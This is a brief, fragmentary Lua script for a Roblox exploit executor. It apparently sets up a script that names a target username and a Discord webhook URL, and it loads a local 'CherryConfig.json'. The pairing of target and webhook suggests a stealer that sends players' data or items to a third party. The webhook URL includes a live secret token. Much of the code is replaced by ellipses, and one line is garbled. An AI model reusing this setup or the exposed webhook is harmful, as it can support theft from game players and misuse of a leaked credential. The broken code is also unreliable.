-- Mode: CUSTOM
getgenv().TARGET_USERNAME = "Hola13728287"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1481773355618144418/Fng5CGGg3hLRoicCXEhUACxOH_Tf0-0A6d_DzSOCWzlMbh3x_s09QWe59QssLpbZLjeC"
    ...
    task.spawn(function()
        ...
        if isfile and isfile("CherryConfig.json") then
            ...
            if ok and type(data) == "table" then
                ...
                if data.introSongChoice then M.introSongChoice =e end
